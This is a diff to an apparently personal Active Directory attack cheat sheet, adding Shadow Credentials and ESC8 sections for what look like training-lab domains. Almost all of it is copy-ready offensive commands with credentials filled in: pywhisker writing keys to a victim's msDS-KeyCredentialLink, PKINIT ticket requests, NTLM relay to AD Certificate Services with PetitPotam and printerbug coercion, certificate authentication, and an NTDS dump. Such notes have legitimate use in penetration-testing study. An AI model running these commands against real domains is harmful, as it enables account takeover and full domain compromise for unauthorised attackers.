@@ -109,14 +109,45 @@ nxc smb dc -u 'user' -H 'hash' --ntds --user 'Administrator'
 ```
 
 # Privilege Escalation
+
+## Shadow Credential
+
+**Shadow Credentials** abuse the `msDS-KeyCredentialLink` attribute to add an attacker-controlled public key for PKINIT authentication.
+
+In BloodHound, `AddKeyCredentialLink` means a user can write to that attribute and potentially take over the target account.
+
+```bash
+# The command below generates an `X.509 certificate` and writes the `public key` to the victim user's `msDS-KeyCredentialLink` attribute
+pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
+
+# Request TGT
+python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+```
+
 ## ESC8
 
 ```bash
 impacket-ntlmrelayx -t http://10.0.30.19/certsrv/certfnsh.asp \ -smb2support --adcs --template DomainController
 
-# two options (PetitPotam or printerbug)
+# Two options (PetitPotam or printerbug)
+# PetitPotam
 python3 PetitPotam.py -u jtrueblood -p 'blood_brothers' \ -d shadow.gate <YOUR_IP> 10.0.30.19
 
-# https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
+# printerbug - https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
 python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
+```
+
+```bash
+# Two options
+# certipy
+certipy auth -pfx 'dc.pfx' -dc-ip '10.0.0.100'
+
+# pkinit
+[ -d PKINITtools ] || git clone https://github.com/dirkjanm/PKINITtools.git; \
+cd PKINITtools && \
+uv venv .venv && \
+source .venv/bin/activate && \
+uv pip install -r requirements.txt && \
+uv pip install -I git+https://github.com/wbond/oscrypto.git && \
+uv run python gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
 ```
